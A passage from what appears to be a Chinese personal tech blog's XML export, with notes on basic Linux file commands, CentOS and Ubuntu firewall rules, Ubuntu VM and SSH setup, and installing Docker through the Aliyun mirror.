   <span class="token function">mv</span> aaa bbb
<span class="token number">2</span>. 将所有的C程序移至 Finished 子目录中：
   <span class="token function">mv</span> <span class="token parameter variable">-i</span> *.c  Finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="rm：删除文件及目录">rm：删除文件及目录</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：rm <span class="token punctuation">[</span>-ifr<span class="token punctuation">]</span> name<span class="token punctuation">..</span>.
   <span class="token parameter variable">-i</span>  删除前逐一询问确认。
   <span class="token parameter variable">-f</span>  即使原文件属性设为只读，也直接删除，无需逐一确认。
   <span class="token parameter variable">-r</span>  将目录及以下之文件逐一删除。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>范例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.  删除所有C程序文件并删除前逐一询问确认 <span class="token builtin class-name">:</span>
<span class="token function">rm</span> <span class="token parameter variable">-i</span> *.c
<span class="token number">2</span>. 将 Finished 子目录及子目录中所有文件删除 <span class="token builtin class-name">:</span>
<span class="token function">rm</span> <span class="token parameter variable">-r</span> Finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="tail条件查看文件内容">tail条件查看文件内容</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：tail <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token punctuation">]</span> <span class="token punctuation">[</span> <span class="token parameter variable">-c</span> Number <span class="token operator">|</span> <span class="token parameter variable">-n</span> Number <span class="token operator">|</span> <span class="token parameter variable">-m</span> Number <span class="token operator">|</span> <span class="token parameter variable">-b</span> Number <span class="token operator">|</span> <span class="token parameter variable">-k</span> Number <span class="token punctuation">]</span>  文件名称
<span class="token parameter variable">-f</span>  该参数用于监视File文件增长。
<span class="token parameter variable">-c</span>  Number 从 Number 字节位置读取指定文件
<span class="token parameter variable">-n</span>  Number 从 Number 行位置读取指定文件。
<span class="token parameter variable">-m</span>  Number 从 Number 多字节字符位置读取指定文件，比方你的文件假设包括中文字，假设指定-c参数，可能导致截断，但使用-m则会避免该问题。
<span class="token parameter variable">-b</span>  Number 从 Number 表示的512字节块位置读取指定文件。
<span class="token parameter variable">-k</span>  Number 从 Number 表示的1KB块位置读取指定文件。
上述命令中，都涉及到number，假设不指定，默认显示10行。
Number前面可使用正负号，表示该偏移从顶部还是从尾部開始计算。
tail可运行文件一般在/usr/bin/以下。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、  <span class="token function">tail</span> <span class="token parameter variable">-f</span> filename 
说明：监视filename文件的尾部内容（默认10行，相当于增加参数 <span class="token parameter variable">-n</span> <span class="token number">10</span>），刷新显示在屏幕上。退出，按下CTRL+C。 
<span class="token number">2</span>、  <span class="token function">tail</span> <span class="token parameter variable">-n</span> <span class="token number">20</span> filename 
说明：显示filename最后20行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="cat：-查看文件-文件拼接">cat： 查看文件(文件拼接)</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：cat <span class="token punctuation">[</span>-AbeEnstTuv<span class="token punctuation">]</span> <span class="token punctuation">[</span>--help<span class="token punctuation">]</span> <span class="token punctuation">[</span>--version<span class="token punctuation">]</span> fileName
说明：把文件串连接后输出到荧幕或加 <span class="token operator">&gt;</span> fileName 到另一个档案
参数：
    <span class="token parameter variable">-A</span> 等价于 <span class="token parameter variable">-vET</span>
    -n或 <span class="token parameter variable">--number</span> 由 <span class="token number">1</span> 开始对所有输出的行数编号
    -b或 --number-nonblank和 <span class="token parameter variable">-n</span> 相似，只不过对于空白行不编号
    <span class="token parameter variable">-e</span> 等价于 –vE
    <span class="token parameter variable">-E</span> 每行末尾显示一个$符号
    -s或 --squeeze-blank 当遇到有连续两行以上的空白行，就代换为一行的空白行
    <span class="token parameter variable">-t</span> 等价于 –vT
    <span class="token parameter variable">-T</span> 显示制表符为 ^I
    -v或 --show-nonprinting,  dos格式的回车换行显示为^M<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>范例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 把 textfile1 的文件内容加上行号后输入到 textfile2 文件里：
 <span class="token function">cat</span> <span class="token parameter variable">-n</span> textfile1 <span class="token operator">&gt;</span> textfile2
<span class="token number">2</span>. 把 textfile1 和 textfile2 的文件内容加上行号（空白行不加）之后将内容附加到 textfile3 ：
 <span class="token function">cat</span> <span class="token parameter variable">-b</span> textfile1 textfile2 <span class="token operator">&gt;&gt;</span> textfile3
（ <span class="token operator">&gt;</span> 为重定向操作符， <span class="token operator">&gt;&gt;</span>为重定向追加操作符 ）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="more：文件查看">more：文件查看</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：more  <span class="token punctuation">[</span>-num<span class="token punctuation">]</span> <span class="token punctuation">[</span>+linenum<span class="token punctuation">]</span> <span class="token punctuation">[</span>fileNames<span class="token punctuation">..</span><span class="token punctuation">]</span>
说明：类似 <span class="token function">cat</span> ，不过是以一页一页的方式显示。而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示。
参数：
   <span class="token parameter variable">-num</span> 一次显示的行数
    +linenum 从第 num 行开始显示
         fileNames 欲显示内容的文件，可为多个文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>范例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">从第 <span class="token number">20</span> 行开始显示 testfile 之文件内容。

<span class="token function">more</span> +20 testfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="less：文件查看">less：文件查看</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式： <span class="token function">less</span> <span class="token punctuation">[</span>Option<span class="token punctuation">]</span>  filename
说明： <span class="token function">less</span> 的作用与 <span class="token function">more</span> 十分相似，都可以用来浏览文本文件的内容，不同的是 <span class="token function">less</span> 允许使用者往回卷动（PageUp PageDown）以浏览已经看过的部份，同时因为 <span class="token function">less</span> 并未在一开始就读入整个文件，因此在遇上大型文件的开启时，会比一般的文本编辑器<span class="token punctuation">(</span>如  <span class="token function">vi</span><span class="token punctuation">)</span>来的快速。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="touch：新建文件">touch：新建文件</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="mkdir：创建目录">mkdir：创建目录</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span>  dirName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="ln：创建软链接">ln：创建软链接</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@hots-Lenovo:/data<span class="token comment"># apt install tree</span>
root@hots-Lenovo:/data<span class="token comment"># tree</span>
<span class="token builtin class-name">.</span>
├── link-real
│   ├── a-real
│   └── b-real
│       └── test.txt
└── link-soft

<span class="token number">4</span> directories, <span class="token number">1</span> <span class="token function">file</span>
root@hots-Lenovo:/data<span class="token comment"># ln -s /data/link-real/a-real  /data/link-soft/a-soft</span>
root@hots-Lenovo:/data<span class="token comment"># </span>
root@hots-Lenovo:/data<span class="token comment"># </span>
root@hots-Lenovo:/data<span class="token comment"># ln -s /data/link-real/b-real  /data/link-soft/b-soft</span>
root@hots-Lenovo:/data<span class="token comment"># tree</span>
<span class="token builtin class-name">.</span>
├── link-real
│   ├── a-real
│   └── b-real
│       └── test.txt
└── link-soft
    ├── a-soft -<span class="token operator">&gt;</span> /data/link-real/a-real
    └── b-soft -<span class="token operator">&gt;</span> /data/link-real/b-real

<span class="token number">6</span> directories, <span class="token number">1</span> <span class="token function">file</span>
root@hots-Lenovo:/data<span class="token comment"># realpath /data/link-soft/a-soft</span>
/data/link-real/a-real
root@hots-Lenovo:/data<span class="token comment"># realpath /data/link-soft/b-soft</span>
/data/link-real/b-real
root@hots-Lenovo:/data<span class="token comment"># </span>
root@hots-Lenovo:/data<span class="token comment"># </span>
root@hots-Lenovo:/data<span class="token comment"># cd /data/link-soft/b-soft</span>
root@hots-Lenovo:/data/link-soft/b-soft<span class="token comment"># ls</span>
test.txt
root@hots-Lenovo:/data/link-soft/b-soft<span class="token comment"># </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>验证软链接创建</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@hots-Lenovo:/yunzhou/docker_mirror<span class="token comment"># realpath /yunzhou/docker_mirror</span>
/data/docker_mirror
root@hots-Lenovo:/yunzhou/docker_mirror<span class="token comment"># realpath /yunzhou/yunzhou_data</span>
/data/yunzhou_data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1>truncate：清空文件</h1>
<blockquote>
<p>清空正在使用的 catalina.out文件</p>
</blockquote>
<ul>
<li>
<p>使用 truncate 命令清空文件</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># -s 参数是设置文件的大小，清空文件的话，就设定为0</span>
truncate <span class="token parameter variable">-s</span> <span class="token number">0</span> catalina.out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用 echo 命令清空文件</p>
  <pre class="line-numbers language-none"><code class="language-none">echo -n " " &gt; catalina.out  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux防火墙</title>
    <url>/20221030/e26546c7.html</url>
    <content><![CDATA[<h1>Centos 防火墙</h1>
<h2 id="firewall服务">firewall服务</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">
<span class="token comment"># 查看默认防火墙状态</span>
firewall-cmd <span class="token parameter variable">--state</span>

<span class="token comment"># 启动</span>
systemctl start firewalld
<span class="token comment"># 开机启动</span>
systemctl <span class="token builtin class-name">enable</span> firewalld

<span class="token comment"># 重新载入，更新防火墙规则</span>
firewall-cmd <span class="token parameter variable">--reload</span>


<span class="token comment"># 关闭防火墙</span>
systemctl stop firewalld.service 
<span class="token comment"># 或者关闭防火墙</span>
systemctl disable firewalld.service


<span class="token comment"># 重启防火墙</span>
systemctl restart firewalld.service
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="firewall配置">firewall配置</h2>
<ul>
<li>
<p>查看防火墙规则</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看全部端口</span>
firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --list-ports
<span class="token comment"># 全部规则</span>
firewall-cmd --list-all
<span class="token comment"># 查看指定端口</span>
firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --query-port<span class="token operator">=</span><span class="token number">3306</span>/tcp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>查看区域信息</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">firewall-cmd --get-active-zones
firewall-cmd --list-all-zones<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>暴露端口</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#添加端口 </span>
firewall-cmd <span class="token parameter variable">--permanent</span> <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">3306</span>/tcp
<span class="token comment">#删除端口</span>
firewall-cmd  <span class="token parameter variable">-permanent</span> --remove-port<span class="token operator">=</span><span class="token number">3306</span>/tcp <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>IP白名单（添加）</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 添加白名单</span>
firewall-cmd <span class="token parameter variable">--permanent</span> <span class="token parameter variable">--zone</span><span class="token operator">=</span>trusted --add-source<span class="token operator">=</span><span class="token number">10.42</span>.0.15
<span class="token comment"># 移除白名单</span>
firewall-cmd <span class="token parameter variable">--permanent</span> <span class="token parameter variable">--zone</span><span class="token operator">=</span>trusted --remove-source<span class="token operator">=</span><span class="token number">10.42</span>.0.15
<span class="token comment"># 更新防火墙规则</span>
firewall-cmd  <span class="token parameter variable">--reload</span>
<span class="token comment"># 查看IP白名单</span>
firewall-cmd  <span class="token parameter variable">--zone</span><span class="token operator">=</span>trusted --list-all



<span class="token comment">#开启某个端口(指定IP可访问)</span>
firewall-cmd <span class="token parameter variable">--permanent</span> <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-rich-rule<span class="token operator">=</span><span class="token string">'rule family="ipv4" source address="10.1.1.14/32" port protocol="tcp" port="80" accept'</span>
<span class="token comment">#删除策略</span>
firewall-cmd <span class="token parameter variable">--permanent</span> <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --remove-rich-rule<span class="token operator">=</span><span class="token string">'rule family="ipv4" source address="10.1.1.14/32" port protocol="tcp" port="80" accept'</span>



<span class="token comment"># 把docker0网卡添加到trusted域</span>
firewall-cmd <span class="token parameter variable">--permanent</span> <span class="token parameter variable">--zone</span><span class="token operator">=</span>trusted --change-interface<span class="token operator">=</span>docker0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 查看系统信息</title>
    <url>/20221030/d81e4de4.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>查看 linux 内核，GCC 版本</td>
<td>ubantu : <code>cat /proc/version</code><br>Linux 的 Redhat/Centos: <code>cat /etc/redhat-release</code></td>
</tr>
<tr>
<td>系统版本</td>
<td><code>uname -a</code></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lisa@ubuntu:~$ <span class="token function">cat</span> /proc/version
Linux version <span class="token number">5.19</span>.0-32-generic <span class="token punctuation">(</span>buildd@lcy02-amd64-026<span class="token punctuation">)</span> <span class="token punctuation">(</span>x86_64-linux-gnu-gcc <span class="token punctuation">(</span>Ubuntu <span class="token number">11.3</span>.0-1ubuntu1~22.04<span class="token punctuation">)</span> <span class="token number">11.3</span>.0, GNU ld <span class="token punctuation">(</span>GNU Binutils <span class="token keyword">for</span> Ubuntu<span class="token punctuation">)</span> <span class="token number">2.38</span><span class="token punctuation">)</span> <span class="token comment">#33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 30 17:03:34 UTC 2</span>
alisa@ubuntu:~$ 
alisa@ubuntu:~$ 
alisa@ubuntu:~$ <span class="token function">uname</span> <span class="token parameter variable">-a</span>
Linux ubuntu <span class="token number">5.19</span>.0-32-generic <span class="token comment">#33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 30 17:03:34 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span>
alisa@ubuntu:~$ ^C
alisa@ubuntu:~$ lsb_release <span class="token parameter variable">-a</span>
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu <span class="token number">22.04</span>.2 LTS
Release:	<span class="token number">22.04</span>
Codename:	jammy
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>LTS(Long-Term-Support)长期支持版本，会获得5年的升级维护支持。</p>
</blockquote>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu虚拟机搭建</title>
    <url>/20221030/6124f545.html</url>
    <content><![CDATA[<h1>基础工具安装</h1>
<ul>
<li>
<p>apt-get -y install wget    (wget)</p>
</li>
<li>
<p>apt-get -y install net-tools   (ifconfig)</p>
</li>
<li>
<p>snap install curl</p>
</li>
</ul>
<h1>安装软件</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">teamviewer_linux.deb
<span class="token function">sudo</span> dpkg <span class="token parameter variable">--install</span> teamviewer_linux.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>首次登录切换root</h1>
<p>su切换至root权限时报错<code>su: Authentication failure</code></p>
<p>分析原因：<strong>可能是初次使用此命令，需要更新root密码</strong></p>
<p>解决方法：执行<code>sudo passwd root</code>命令，完成后再次输入su即可切换权限</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220505102534819-1678133189220-1.png" alt="image-20220505102534819"></p>
<h1>安装SSH服务器端</h1>
<ul>
<li>
<p>执行<code>apt-get install openssh-server</code> ，安装服务端</p>
</li>
<li>
<p>允许远程使用root账号ssh登入</p>
<p>修改/etc/ssh/sshd_config文件，修改如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#PermitRootLogin prohibit-password</span>
PermitRootLogin <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>需要重启系统或者sshd服务</p>
<ul>
<li>sudo /etc/init.d/ssh stop</li>
<li>sudo /etc/init.d/ssh start</li>
<li>sudo service ssh start</li>
</ul>
</li>
<li>
<p>开机启动<code>sudo systemctl enable ssh</code></p>
</li>
<li>
<p>重启之后，<code>/usr/bin/xauth: file /root/.Xauthority does not exist</code> 错误消失</p>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 防火墙</title>
    <url>/20221030/b8b8d517.html</url>
    <content><![CDATA[<h1>查看防火墙的状态</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>inactive</code>表示防火墙没有开启，并不是没有安装防火墙。</p>
<p>安装防火墙（Ubuntu系统默认是安装了ufw防火墙的）：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install ufw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>Ubuntu开启防火墙</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw <span class="token builtin class-name">enable</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>命令可能会中断现有的ssh连接。继续操作(y|n)?</p>
<p>因为是在远程的Xshell进行连接开启防火墙的，有的系统是没有将SSH的22端口设置为public的，所以会有这样的提示.</p>
<p>这里分为两种情况，如果开启防火墙时在防火墙之中检测到22端口已添加为防火墙的开放端口，那么输入y继续操作以后，当前Xshell会自动断开连接；</p>
<p>相反，如果开启防火墙时在防火墙之中没有检测到22端口，那么输入y继续操作以后22端口将会不再支持其他连接，只支持当前已有的这个连接，保持当前连接的原因是可以通过该连接开放22端口。</p>
<p>这里之前没有设置过，直接输入y继续执行</p>
<h1>Ubuntu防火墙添加开放普通端口</h1>
<p>开放22端口</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>开启完成，需要重启防火墙生效：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw reload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看防火墙的状态</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@ubuntu:/opt/docker/elasticsearch<span class="token comment"># sudo ufw status</span>
Status: active

To                         Action      From
--                         ------      ----
<span class="token number">22</span>                         ALLOW       Anywhere               
<span class="token number">22</span> <span class="token punctuation">(</span>v6<span class="token punctuation">)</span>                    ALLOW       Anywhere <span class="token punctuation">(</span>v6<span class="token punctuation">)</span>               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看22端口的监听状态</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@ubuntu:/opt/docker/elasticsearch<span class="token comment"># sudo netstat -tunlp | grep 22</span>
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">839</span>/sshd: /usr/sbin 
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::22                   :::*                    LISTEN      <span class="token number">839</span>/sshd: /usr/sbin <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>Ubuntu防火墙关闭普通端口</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw delete allow <span class="token number">21</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>Ubuntu防火墙开放规定协议的端口</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow <span class="token number">8001</span>/tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>Ubuntu防火墙关闭指定协议端口</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw delete allow <span class="token number">8001</span>/tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>Ubuntu防火墙开放限定ip地址端口</h1>
<ul>
<li>
<p>开放指定ip所有操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow from <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>关闭指定ip所有操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw delete allow from <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>开放指定ip对应端口操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow from <span class="token number">192.168</span>.1.12 to any port <span class="token number">3306</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>开放指定ip对应端口操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw delete allow from <span class="token number">192.168</span>.1.12 to any port <span class="token number">3306</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 安装Docker</title>
    <url>/20221030/d288da69.html</url>
    <content><![CDATA[<h1>1.卸载旧版本Docker</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#卸载旧版本docker</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> remove <span class="token function">docker</span> docker-engine docker-ce docker.io  

<span class="token comment">#清空旧版docker占用的内存</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> remove --auto-remove <span class="token function">docker</span>

<span class="token comment">#更新系统源</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>2.配置安装环境</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https ca-certificates <span class="token function">curl</span> gnupg-agent software-properties-common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>3. 添加阿里云的docker GPG密钥</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>4. 添加阿里镜像源</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository <span class="token string">"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="token variable"><span class="token variable">$(</span>lsb_release <span class="token parameter variable">-cs</span><span class="token variable">)</span></span> stable"</span>

<span class="token comment">#更新</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1>5. 查看有哪些版本</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-cache</span> madison docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><a href="https://img-blog.csdnimg.cn/20200613220949677.png"><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200613220949677.png" alt="img"></a></p>
<h1>6. 安装最新版/指定版本</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装最新版</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce

<span class="token comment">#安装5:19.03.6~3-0~ubuntu-bionic版</span>
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce<span class="token operator">=</span><span class="token number">5</span>:19.03.6~3-0~ubuntu-bionic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>7. 重启Docker</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">docker</span> restart
<span class="token comment">#或者</span>
<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>8. 查看Docke版本</h1>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>9. 配置阿里容器镜像加速器</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/3f08ca0f-65ec-427d-87f4-3f3d27fb6f52.png" alt="配置阿里容器镜像加速器"></p>
<ul>
<li>
<p>针对Docker客户端版本大于 1.10.0 的用户</p>
</li>
<li>
<p>修改daemon配置文件/etc/docker/daemon.json来使用加速器</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json">创建配置文件目录
$ sudo mkdir /etc/docker

编辑配置文件，如果文件不存在，以下命令会自动创建。
$ sudo nano /etc/docker/daemon.json

将配置信息粘贴到配置文件中，配置信息为 json 格式，可以根据实际需要设置多个国内的镜像服务器。
<span class="token punctuation">{</span>
  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"https://hub-mirror.c.163.com"</span><span class="token punctuation">,</span>
    <span class="token string">"https://mirror.baidubce.com"</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>重启 Docker 服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl daemon-reload 
$ <span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>检查设置是否生效</p>
